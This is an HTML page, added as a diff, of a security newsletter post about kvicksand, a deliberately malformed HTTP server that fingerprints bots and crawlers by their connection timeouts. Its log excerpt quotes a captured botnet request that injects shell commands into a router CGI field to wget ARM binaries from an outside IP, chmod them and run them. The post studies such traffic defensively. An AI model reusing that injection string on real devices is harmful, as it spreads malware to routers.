@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html lang="en-us">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+
+  
+  <title>Capturing Robots With Kvicksand - Newsletter</title>
+
+  
+  
+  <meta name="description" content="Last year I was doing a series ofwebinars on software fuzzing. Me andPasi from F-Secure compared methods where we tried two different techniques for fuzzing HTTP clients. Fuzzing is essentially a brute-force method for finding bugs in software. You try various inputs and see what happens. My method was based on running each fuzzer engine in a Docker instance, using a local network and a shared file system for coordination between instances." />
+  <meta name="author" content="" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="https://www.jerkeby.se/newsletter/app.min.css" />
+
+  
+  <link rel="preload stylesheet" as="style" href="https://www.jerkeby.se/newsletter/an-old-hope.min.css" />
+  <script
+    defer
+    src="https://www.jerkeby.se/newsletter/highlight.min.js"
+    onload="hljs.initHighlightingOnLoad();"
+  ></script>
+  
+
+  
+  <link rel="preload" as="image" href="https://www.jerkeby.se/newsletter/theme.png" />
+
+  
+  <link rel="preload" as="image" href="https://www.jerkeby.se/newsletter/twitter.svg" />
+  
+  <link rel="preload" as="image" href="https://www.jerkeby.se/newsletter/github.svg" />
+  
+
+  
+  <link rel="icon" href="https://www.jerkeby.se/newsletter/favicon.ico" />
+  <link rel="apple-touch-icon" href="https://www.jerkeby.se/newsletter/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.88.1" />
+
+  
+  
+
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Capturing Robots With Kvicksand" />
+<meta property="og:description" content="Last year I was doing a series ofwebinars on software fuzzing. Me andPasi from F-Secure compared methods where we tried two different techniques for fuzzing HTTP clients. Fuzzing is essentially a brute-force method for finding bugs in software. You try various inputs and see what happens. My method was based on running each fuzzer engine in a Docker instance, using a local network and a shared file system for coordination between instances." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.jerkeby.se/newsletter/posts/capturing-robots-with-kvicksand/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-10-18T00:00:00+00:00" />
+
+
+  
+  <meta itemprop="name" content="Capturing Robots With Kvicksand">
+<meta itemprop="description" content="Last year I was doing a series ofwebinars on software fuzzing. Me andPasi from F-Secure compared methods where we tried two different techniques for fuzzing HTTP clients. Fuzzing is essentially a brute-force method for finding bugs in software. You try various inputs and see what happens. My method was based on running each fuzzer engine in a Docker instance, using a local network and a shared file system for coordination between instances."><meta itemprop="datePublished" content="2021-10-18T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2021-10-18T00:00:00+00:00" />
+<meta itemprop="wordCount" content="624">
+<meta itemprop="keywords" content="" />
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Capturing Robots With Kvicksand"/>
+<meta name="twitter:description" content="Last year I was doing a series ofwebinars on software fuzzing. Me andPasi from F-Secure compared methods where we tried two different techniques for fuzzing HTTP clients. Fuzzing is essentially a brute-force method for finding bugs in software. You try various inputs and see what happens. My method was based on running each fuzzer engine in a Docker instance, using a local network and a shared file system for coordination between instances."/>
+
+  
+  
+</head>
+
+
+  <body class="not-ready" data-menu="false">
+    <header class="header">
+  
+  <p class="logo">
+    <a class="site-name" href="https://www.jerkeby.se/newsletter">Newsletter</a><a class="btn-dark"></a>
+  </p>
+  
+
+  <script>
+    let bodyClx = document.body.classList;
+    let btnDark = document.querySelector('.btn-dark');
+    let sysDark = window.matchMedia('(prefers-color-scheme: dark)');
+    let darkVal = localStorage.getItem('dark');
+
+    let setDark = (isDark) => {
+      bodyClx[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark ? 'yes' : 'no');
+    };
+
+    setDark(darkVal ? darkVal === 'yes' : sysDark.matches);
+    requestAnimationFrame(() => bodyClx.remove('not-ready'));
+
+    btnDark.addEventListener('click', () => setDark(!bodyClx.contains('dark')));
+    sysDark.addEventListener('change', (event) => setDark(event.matches));
+  </script>
+
+  
+  
+
+  
+  <nav class="social">
+    
+    <a
+      class="twitter"
+      style="--url: url(./twitter.svg)"
+      href="https://twitter.com/kuggofficial"
+      target="_blank"
+    ></a>
+    
+    <a
+      class="github"
+      style="--url: url(./github.svg)"
+      href="https://github.com/kugg"
+      target="_blank"
+    ></a>
+    
+  </nav>
+  
+</header>
+
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-title">
+    <p>
+      <time>Oct 18, 2021</time>
+      
+    </p>
+    <h1>Capturing Robots With Kvicksand</h1>
+  </header>
+  <section class="post-content"><p>Last year I was doing a series of<a href="https://www.youtube.com/watch?v=_ngq3yL0dkg"> webinars on software fuzzing</a>. Me and<a href="https://www.twitter.com/pasi_s7"> Pasi</a> from F-Secure compared methods where we tried two different techniques for fuzzing HTTP clients. Fuzzing is essentially a brute-force method for finding bugs in software. You try various inputs and see what happens. My method was based on running each fuzzer engine in a Docker instance, using a local network and a shared file system for coordination between instances. I called it <a href="https://github.com/kugg/fuzzminator">the fuzzminator</a>. It wasn&rsquo;t the best method. It was too slow and only usable for small applications. It did find one application hang in the HTTP client curl that<a href="https://hackerone.com/reports/889160"> I reported</a> to the maintainer<a href="https://daniel.haxx.se/"> Bagder</a>.</p>
+<h1 id="the-hang">The hang</h1>
+<p>It&rsquo;s really silly. If an HTTP server responds with an incomplete header, the client will have to wait until either the server closes the connection or a client timeout is reached. Curl has a timeout option &ldquo;-m, &ndash;max-time&rdquo; that can be used as a hard timeout. Clearly this is not a vulnerability because that event can be handled by anyone who uses that option. Later it became apparent to me that not all HTTP clients have this option.</p>
+<p>Here is an example of an incomplete server response:</p>
+<p><code>echo -e &quot;HTTP/1.1 200 OK\r\nLocation:\r\nContent-Range:\r\nConnection:\r\n&quot; | nc --listen --source-port 8080</code></p>
+<p><img src="https://dim.mcusercontent.com/cs/ddd7ae486331199e51e491d97/images/4a65b922-2d5d-5037-34fc-23faa9af1b3b.jpg?w=564&amp;dpr=2" alt=""></p>
+<h1 id="introducing-kvicksand">Introducing kvicksand</h1>
+<p>For the sake of science I decided to script a minimal malformed HTTP server designed to measure how HTTP clients handle malformed headers and timeouts. If you want to try this yourself you can find the <a href="https://github.com/kugg/kvicksand">server here</a>. This is how it works:</p>
+<ol>
+<li>The server receives a new TCP connection, logs the IP address and the time</li>
+<li>The client sends a HTTP request that the server logs</li>
+<li>The server responds with incomplete HTTP headers</li>
+<li>The server waits for the client to close the TCP connection and notes the time of closing</li>
+</ol>
+<p><strong>Disclaimer</strong>: <em>The script is written only for the purpose of collecting data to this newsletter and is not intended for production use. May it inspire you to do better!</em></p>
+<h1 id="results">Results</h1>
+<p>First of all, robots almost always use a consistent timeout. For instance, zgrabber always waits for 10 seconds. Twitterbot always starts with a timeout of 15 seconds when it requests the robots.txt file. This means that regardless of the User-Agent request header or source IP you can pretty much recognize an automated HTTP client on its max-timeout value.</p>
+<p>A user who unknowingly requests Kvicksand in an <code>&lt;iframe&gt;</code> or an <code>&lt;img&gt;</code> tag rarely leaves the site after a number of whole seconds. Human visitors (almost) always leave a page (i.e. close the connection) after fractions of seconds. This means that the Kvicksand heuristics can be useful for<a href="https://antcpt.com/eng/information/demo-form/recaptcha-3-test-score.html"> determining a &ldquo;CAPTCHA score&rdquo;</a>.</p>
+<p>Secondly, a few of the more malicious botnets around have not implemented a max-timeout at all. Forks of the Mirai botnet did not have a max-timeout so it waited and was blocked for five minutes (300 seconds was my server max-wait). I downloaded and disassembled a payload from the bot and lo and behold &ndash; it was single-threaded and did not have a timeout, so yes you can block the bad bots!</p>
+<h1 id="logs">Logs</h1>
+<p>Below are some log excerpts in comma-separated format (CSV):</p>
+<p>Malware:</p>
+<pre tabindex="0"><code>&quot;User-agent&quot;, &quot;timeout (seconds)&quot;, &quot;IP address&quot;, &quot;Request&quot;;
+&quot;KrebsOnSecurity&quot;, &quot;0&quot;,&quot;205.185.119.4&quot;,&quot;GET /dnslookup.cgi?host_name=[www.google.com](http://www.google.com/);+cd+/tmp;rm+arm+arm7;wget+http:/\/[205.185.126.200/arm7;chmod+777+arm7;./arm7+netgear;wget+http:/\/205.185.126.200/arm;chmod+777+arm;./arm+netgear&amp;lookup=Lookup&amp;ess_=true](http://205.185.126.200/arm7;chmod+777+arm7;./arm7+netgear;wget+http:/%5C/205.185.126.200/arm;chmod+777+arm;./arm+netgear&amp;lookup=Lookup&amp;ess_=true) HTTP/1.1&quot;
+&quot;Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot;, &quot;10&quot;,&quot;180.149.125.175&quot;,&quot;GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1
+&quot;Mozila/5.0&quot;, &quot;300&quot;,&quot;194.163.173.129&quot;,&quot;POST /HNAP1/ HTTP/1.1&quot; &lt;- Mirai
+</code></pre><p>Crawlers:</p>
+<pre tabindex="0"><code>&quot;User-agent&quot;, &quot;timeout (seconds)&quot;, &quot;IP address&quot;, &quot;Request&quot;;
+&quot;Mozilla/5.0 zgrab/0.x&quot;, &quot;10&quot;,&quot;198.199.112.175&quot;,&quot;GET / HTTP/1.1&quot;
+&quot;Mozilla/5.0 zgrab/0.x&quot;, &quot;10&quot;,&quot;18.136.194.238&quot;,&quot;GET / HTTP/1.1&quot;
+&quot;Twitterbot/1.0&quot;, &quot;15&quot;,&quot;199.16.157.181&quot;,&quot;GET /robots.txt HTTP/1.1&quot;
+&quot;Twitterbot/1.0&quot;, &quot;2&quot;,&quot;199.16.157.181&quot;,&quot;GET / HTTP/1.1&quot;
+</code></pre><h1 id="still-there">Still there?</h1>
+<p>I&rsquo;m currently working with multiple clients to try to finalize my schedule. I do have time for your feedback and inquiries, so please stay in touch!</p>
+<p>I want to send out a special thank you to <a href="https://twitter.com/labanskoller">Laban Sköllermark</a> for Quality Assurance on this newsletter!</p>
+</section>
+
+  
+  
+
+  
+  
+  
+  <nav class="post-nav">
+     
+    <a class="next" href="https://www.jerkeby.se/newsletter/posts/coffee-time/"><span>Coffee Time</span><span>→</span></a>
+    
+  </nav>
+  
+
+  
+  
+</article>
+
+</main>
+
+    <footer class="footer">
+  <p>&copy; 2021 <a href="https://www.jerkeby.se/newsletter">Newsletter</a></p>
+  <p>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️</p>
+  <p>
+    <a href="https://github.com/nanxiaobei/hugo-paper" rel="noopener" target="_blank">Paper 5.1</a>
+  </p>
+</footer>
+
+  </body>
+</html>
